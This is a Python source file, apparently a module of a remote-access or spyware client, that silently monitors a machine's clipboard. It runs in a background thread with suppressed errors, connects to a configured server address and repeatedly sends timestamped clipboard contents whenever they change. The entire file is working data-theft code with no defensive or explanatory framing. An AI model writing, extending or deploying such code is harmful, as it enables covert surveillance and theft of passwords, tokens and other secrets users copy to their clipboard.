'''
    Creates a connection to the server, sending the
    clipboard data in intervals as long as its not
    the same data as before.

    Verified: 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * pyperclip
'''

from client.modules.module import Module
from shared.helper import Helper
from shared.state import Static
from shared.error import Error
from shared.data import Data

import pyperclip
import socket
import time


class Clipper(Module):

    __INTERVAL = Static.LIVE_TIMEOUT / 2

    def __init__(self, token):
        super().__init__(token)
        self.__first = True
        self.__before = ''

    @Error.quiet_thread
    def __send(self):
        with socket.create_connection(
                (Static.IP, Static.PORT)) as sock:
            Data.send(sock, self.token)
            Data.recv(sock)

            while True:
                paste = data = pyperclip.paste()

                if paste == self.__before:
                    data = ''
                else:
                    if self.__first:
                        self.__first = False
                        data = f'{Helper.timestamp()}:{paste}'
                    else:
                        data = f'\n{Helper.timestamp()}:{paste}'

                Data.send(sock, data)
                Data.recv(sock)

                self.__before = paste
                time.sleep(Clipper.__INTERVAL)

    def live(self):
        Helper.thread(self.__send)
